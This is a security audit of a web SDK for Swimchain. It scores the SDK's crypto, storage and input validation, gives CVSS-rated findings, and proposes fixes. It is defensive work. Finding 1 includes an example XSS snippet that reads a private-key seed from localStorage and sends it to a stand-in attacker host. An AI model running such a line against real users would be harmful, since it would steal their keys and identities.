# Security Review: Frontend SDK

## Summary

The Frontend SDK demonstrates **reasonable security fundamentals** with proper use of Web Crypto API, Ed25519 signatures via WASM, and Argon2id for action PoW. However, it has **critical vulnerabilities in key storage and input validation** that could lead to key theft or corruption. The cryptographic implementation is sound, but the surrounding infrastructure needs hardening. **Overall Security Score: 61/100**.

## Scores

| Area | Score | Max | Notes |
|------|-------|-----|-------|
| Auth & Authz | 14 | 25 | Ed25519 signing present but no client-side signature verification flow |
| Crypto Correctness | 20 | 25 | Good algorithm choices, minor nonce handling concerns |
| Input Validation | 10 | 25 | Critical gaps in hex parsing, JSON deserialization, bounds checking |
| Data Protection | 17 | 25 | Seeds stored plaintext in localStorage, no encryption-at-rest |
| **Total** | **61** | **100** | |

## Threat Model

| Threat | Likelihood | Impact | Mitigation |
|--------|------------|--------|------------|
| XSS key theft | Medium | Critical | Seeds stored plaintext in localStorage - easily extractable via XSS |
| localStorage corruption | Medium | High | No JSON schema validation on load - malformed data causes failures |
| Hex injection | Low | Medium | `hexToBytes()` lacks validation - NaN injection possible |
| PoW stockpile attack | Low | Medium | Timestamp in challenge, but no anti-stockpile window validation on client |
| Weak passphrase | High | Medium | No passphrase strength validation before encryption |
| Side-channel timing | Low | Low | Uses timing-safe WASM crypto, Web Crypto API |

## Vulnerabilities Found

### Critical (Exploitable)

#### 1. Plaintext Seed Storage in localStorage
**Vulnerability**: Private key seeds are stored as plaintext hex strings in localStorage.

**Location**: `swimchain-frontend/src/types/index.ts:319`, `useStoredIdentity.ts:38`

**Attack**: Any XSS vulnerability in the application or its dependencies allows attackers to:
```javascript
// Attacker script injected via XSS
const identity = JSON.parse(localStorage.getItem('swimchain-identity'));
fetch('https://attacker.com/steal?seed=' + identity.seed);
```

**Impact**: Complete identity theft - attacker can impersonate user, sign arbitrary messages, and drain reputation.

**Fix**: Encrypt seed at rest using a combination of:
1. Web Crypto API with a key derived from user password (if available)
2. Use `window.crypto.subtle.wrapKey()` with a key derived from browser fingerprint + user PIN
3. Consider IndexedDB with WebAuthn credential protection

**CVSS**: 8.1 (High) - AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N

---

#### 2. Missing Input Validation in hexToBytes()
**Vulnerability**: The `hexToBytes()` function does not validate that the input contains only valid hex characters.

**Location**: `swimchain-frontend/src/lib/action-pow.ts:328-333`, `useStoredKeypair.ts:17-23`

**Attack**:
```typescript
hexToBytes("zzzz") // Returns [NaN, NaN] - corrupts downstream crypto
hexToBytes("00gg00") // Partial parsing with NaN
```

**Impact**: Corrupted key material causes signing failures, potential crash, or unpredictable behavior in crypto operations.

**Fix**:
```typescript
function hexToBytes(hex: string): Uint8Array {
  if (!/^[0-9a-fA-F]*$/.test(hex)) {
    throw new Error('Invalid hex string');
  }
  if (hex.length % 2 !== 0) {
    throw new Error('Hex string must have even length');
  }
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < bytes.length; i++) {
    bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
  }
  return bytes;
}
```

**CVSS**: 5.3 (Medium) - AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L

---

### High

#### 3. No JSON Schema Validation on localStorage Load
**Vulnerability**: Stored identity is parsed with `JSON.parse()` and cast directly to `StoredIdentity` without validation.

**Location**: `swimchain-frontend/src/hooks/useStoredIdentity.ts:24-27`, `IdentityProvider.tsx:43-45`

**Attack**:
```javascript
// Attacker or corrupted storage
localStorage.setItem('swimchain-identity', '{"address":"a","publicKey":123}');
// Next load: identity.publicKey.length throws - or worse, passes through
```

**Impact**: Application crash, corrupted state, or bypassed security checks if validation assumes string types.

**Fix**: Add Zod or JSON Schema validation:
```typescript
const StoredIdentitySchema = z.object({
  address: z.string().regex(/^cs1[a-z0-9]{38,}/),
  publicKey: z.string().regex(/^[0-9a-f]{64}$/i),
  seed: z.string().regex(/^[0-9a-f]{64}$/i),
  createdAt: z.number().int().positive(),
  powSolution: z.optional(z.object({...}))
});
```

**CVSS**: 6.5 (Medium) - AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H

---

#### 4. Passphrase Not Validated Before Encryption
**Vulnerability**: Encryption functions accept any passphrase string including empty strings and weak passwords.

**Location**: `swimchain-frontend/src/lib/encryption.ts:78-106`

**Attack**: Users can encrypt sensitive content with empty or trivially weak passphrases, making brute-force trivial.

**Impact**: False sense of security - encrypted content easily decrypted by attacker.

**Fix**:
```typescript
export async function encryptContent(content: string, passphrase: string): Promise<string> {
  if (!passphrase || passphrase.length < 8) {
    throw new Error('Passphrase must be at least 8 characters');
  }
  // ... rest of function
}
```

**CVSS**: 5.9 (Medium) - AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N

---

### Medium

#### 5. PoW Timestamp Not Client-Side Validated
**Vulnerability**: Client generates timestamp for PoW challenge but does not validate it falls within acceptable window.

**Location**: `swimchain-frontend/src/lib/action-pow.ts:158`

**Attack**: Clock manipulation could allow pre-computing PoW solutions with future timestamps.

**Impact**: PoW rate-limiting bypassed if server doesn't strictly validate timestamps.

**Note**: This is primarily a server-side concern, but client should warn on clock skew.

**CVSS**: 4.3 (Medium) - AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N

---

#### 6. Race Condition in usePow Hook
**Vulnerability**: The `miningRef.current` check is not atomic with state updates.

**Location**: `swimchain-frontend/src/hooks/usePow.ts:45-51`

**Attack**: Rapid sequential calls to `mine()` could bypass the "already mining" check before state is updated.

**Impact**: Multiple concurrent mining operations, resource exhaustion, UI inconsistency.

**Fix**: Use a proper mutex or move to Web Worker with message-based coordination.

**CVSS**: 3.7 (Low) - AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L

---

#### 7. generatePassphrase() Has Modulo Bias
**Vulnerability**: Using `byte % chars.length` introduces modulo bias since 256 % 54 != 0.

**Location**: `swimchain-frontend/src/lib/encryption.ts:200-204`

**Attack**: Reduces entropy of generated passphrases. Some characters appear ~1.85% more often than others.

**Impact**: Theoretical reduction in brute-force difficulty (~0.5 bits for 16-char passphrase).

**Fix**:
```typescript
export function generatePassphrase(length: number = 16): string {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
  const max = Math.floor(256 / chars.length) * chars.length;
  const array = new Uint8Array(length * 2); // Over-provision
  crypto.getRandomValues(array);

  let result = '';
  for (const byte of array) {
    if (result.length >= length) break;
    if (byte < max) {
      result += chars[byte % chars.length];
    }
  }
  return result;
}
```

**CVSS**: 2.6 (Low) - AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N

---

### Low

#### 8. Error Messages Leak Implementation Details
**Vulnerability**: Error messages include internal details like seed lengths and WASM state.

**Location**: `swimchain-frontend/src/hooks/useStoredKeypair.ts:86`

**Attack**: Aids attacker reconnaissance of system internals.

**Impact**: Information disclosure, marginally assists further attacks.

**Fix**: Use generic error messages in production, log details server-side.

**CVSS**: 2.0 (Low)

---

#### 9. Console Logging of Sensitive Operations
**Vulnerability**: Identity operations log whether seed exists and its length.

**Location**: `swimchain-frontend/src/providers/IdentityProvider.tsx:46-49`

**Attack**: Browser console history could leak presence of identity to shoulder surfers.

**Impact**: Minor information disclosure.

**Fix**: Remove or gate behind DEBUG flag.

**CVSS**: 1.8 (Low)

---

## Cryptographic Assessment

### Algorithms Used

| Algorithm | Usage | Assessment |
|-----------|-------|------------|
| Ed25519 | Signatures | **Excellent** - Modern, secure, via WASM |
| AES-256-GCM | Content encryption | **Excellent** - AEAD, via Web Crypto |
| PBKDF2-SHA256 | Key derivation | **Good** - 100k iterations adequate for 2024 |
| Argon2id | Action PoW | **Excellent** - Memory-hard, anti-ASIC |
| SHA-256 | Identity PoW, content hashing | **Good** - Standard, appropriate use |

### Key Management

| Aspect | Assessment |
|--------|------------|
| Key Generation | **Good** - Uses CSPRNG via Web Crypto |
| Key Storage | **Poor** - Plaintext in localStorage, no HSM/TEE |
| Key Derivation | **Good** - PBKDF2 with 100k iterations |
| Key Cleanup | **Partial** - WASM `free()` called but not always in error paths |

### Random Number Generation

| Source | Usage | Assessment |
|--------|-------|------------|
| `crypto.getRandomValues()` | Salt, IV, nonce space | **Excellent** - Browser CSPRNG |
| `crypto.getRandomValues()` | Passphrase generation | **Good** - But has modulo bias |

### Nonce Handling

| Type | Handling | Assessment |
|------|----------|------------|
| AES-GCM IV | 12-byte random per encryption | **Good** - Unique per message |
| PoW nonce space | 8-byte random per challenge | **Good** - Per-challenge isolation |
| PoW counter nonce | Sequential from 0 | **Acceptable** - Combined with random space |

**Concern**: No nonce reuse detection. If the same passphrase encrypts multiple messages, IV collisions are vanishingly unlikely but not monitored.

---

## Attack Surface

### External Inputs

| Input | Source | Validation |
|-------|--------|------------|
| Passphrase | User | **None** - accepts empty |
| Content to encrypt | User | **None** - any string |
| Stored identity JSON | localStorage | **None** - direct cast |
| Hex strings (seed, pubkey) | Storage | **None** - no format validation |
| PoW difficulty | Config/RPC | **None** - used directly |
| Space key (32 bytes) | External | **Yes** - length check |

### Trust Boundaries

```
[User Browser]
    |
    |-- localStorage (untrusted - XSS accessible)
    |-- WASM module (trusted)
    |-- Web Crypto API (trusted - browser sandboxed)
    |
[Network/RPC] (untrusted)
```

### Privileged Operations

| Operation | Risk | Current Protection |
|-----------|------|--------------------|
| Reading seed from storage | High | None (plaintext) |
| Signing messages | High | Requires in-memory keypair |
| Encrypting content | Medium | Requires passphrase/key |
| PoW mining | Low | CPU-bound rate limiting |

---

## Recommendations

### P0 - Critical (Fix Immediately)

1. **Encrypt seeds at rest** - Use IndexedDB with WebAuthn or PBKDF2-derived encryption key
2. **Add hex string validation** - Reject non-hex characters in all `hexToBytes()` functions
3. **Add JSON schema validation** - Validate stored identity structure before use

### P1 - High (Fix Soon)

4. **Enforce minimum passphrase strength** - Require 8+ characters, or provide strength meter
5. **Fix generatePassphrase() modulo bias** - Use rejection sampling
6. **Add rate limiting for storage access** - Prevent rapid identity switching attacks

### P2 - Medium (Plan to Fix)

7. **Move PoW to Web Worker** - Isolates compute from main thread, improves timing behavior
8. **Add clock skew detection** - Warn users if system time differs significantly from network
9. **Remove sensitive console logging** - Gate behind `DEBUG` environment variable

### P3 - Low (Technical Debt)

10. **Add CSP recommendations** - Document required Content Security Policy for SDK consumers
11. **Add key cleanup in error paths** - Ensure `keypair.free()` called even on exceptions
12. **Consider WebAuthn integration** - Hardware-backed key storage for high-security scenarios

---

## Security Best Practices Check

- [x] **No hardcoded secrets** - Keys generated at runtime
- [x] **Timing-safe comparisons** - Uses WASM/Web Crypto for crypto ops
- [ ] **Secure defaults** - Passphrase accepts empty strings
- [ ] **Principle of least privilege** - Seeds exposed to entire app context
- [x] **AEAD encryption** - Uses AES-GCM (authenticated)
- [x] **Modern algorithms** - Ed25519, AES-GCM, Argon2id
- [ ] **Input validation** - Multiple gaps in hex/JSON parsing
- [x] **No deprecated crypto** - No MD5, SHA1, DES, etc.
- [x] **Proper IV handling** - Random 12-byte IVs for AES-GCM
- [ ] **Key rotation support** - No mechanism for identity/key rotation
- [x] **Memory cleanup** - WASM `free()` called (mostly)
- [ ] **Encryption at rest** - Seeds stored plaintext

---

## Swimchain-Specific Security

### PoW Validation (Anti-Stockpile)

| Aspect | Status | Notes |
|--------|--------|-------|
| Timestamp in challenge | **Yes** | `action-pow.ts:158` |
| Nonce space randomization | **Yes** | 8-byte random per challenge |
| Difficulty enforcement | **Client only** | Server must validate |
| Argon2id memory-hard | **Yes** | 8-64 MiB depending on config |

**Gap**: No client-side validation that timestamps are recent. Relies entirely on server.

### Signature Verification

| Aspect | Status | Notes |
|--------|--------|-------|
| Ed25519 signing | **Yes** | Via WASM `keypair.sign()` |
| Signature verification | **Available** | `verify_signature()` exported but not used in SDK |

**Gap**: SDK does not use signature verification - assumes server validates. No client-side message authentication.

### Private Space Encryption

| Aspect | Status | Notes |
|--------|--------|-------|
| AES-256-GCM | **Yes** | Proper AEAD |
| Key size validation | **Yes** | Checks 32 bytes |
| IV uniqueness | **Yes** | Random per encryption |
| Key exchange | **Not in SDK** | X25519 must be done externally |

**Gap**: No guidance on secure key distribution for private spaces.

### Identity Key Protection

| Aspect | Status | Notes |
|--------|--------|-------|
| CSPRNG key generation | **Yes** | Via WASM |
| Seed zeroization | **Partial** | WASM `free()` should zeroize |
| Storage protection | **No** | Plaintext localStorage |
| Export protection | **No** | Seed freely accessible |

---

## Conclusion

The Frontend SDK has a **solid cryptographic foundation** but suffers from **weak peripheral security** around key storage and input validation. The most critical issue is plaintext seed storage in localStorage, which makes any XSS vulnerability catastrophic.

**Immediate Actions**:
1. Add localStorage encryption for seeds
2. Validate all hex string inputs
3. Validate JSON structure of stored identity

**The security posture will improve significantly (to ~80/100) once these P0 issues are addressed.**
